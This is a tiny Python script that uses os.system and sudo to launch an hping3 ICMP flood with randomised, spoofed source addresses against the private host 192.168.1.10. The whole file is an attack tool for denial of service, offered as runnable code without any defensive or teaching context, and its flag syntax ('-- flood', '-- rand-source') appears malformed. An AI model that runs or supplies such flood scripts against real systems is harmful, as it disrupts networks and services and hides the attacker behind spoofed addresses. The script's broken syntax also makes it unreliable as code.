#!/usr/bin/python

import os

cmd = 'sudo hping3 -- flood -- rand-source -- icmp 192.168.1.10'
os.system(cmd)
